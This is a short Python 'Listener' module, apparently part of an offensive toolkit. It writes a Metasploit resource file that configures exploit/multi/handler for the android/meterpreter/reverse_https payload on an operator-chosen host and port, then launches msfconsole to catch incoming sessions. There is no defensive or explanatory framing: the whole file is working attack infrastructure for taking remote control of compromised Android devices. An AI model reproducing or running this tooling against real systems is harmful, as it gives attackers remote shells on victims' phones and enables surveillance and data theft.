#!/usr/bin/env python3
"""
Listener Module
"""

import subprocess
import os
from colorama import Fore, Style

class Listener:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        
    def start(self):
        """Start Metasploit listener"""
        print(f"\n{Fore.YELLOW}[+] Starting listener on {self.lhost}:{self.lport}{Fore.WHITE}")
        
        # Create resource file
        resource_content = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST {self.lhost}
set LPORT {self.lport}
set ExitOnSession false
exploit -j -z
"""
        
        with open("listener.rc", "w") as f:
            f.write(resource_content)
        
        # Start listener
        cmd = f"msfconsole -q -r listener.rc"
        os.system(cmd)
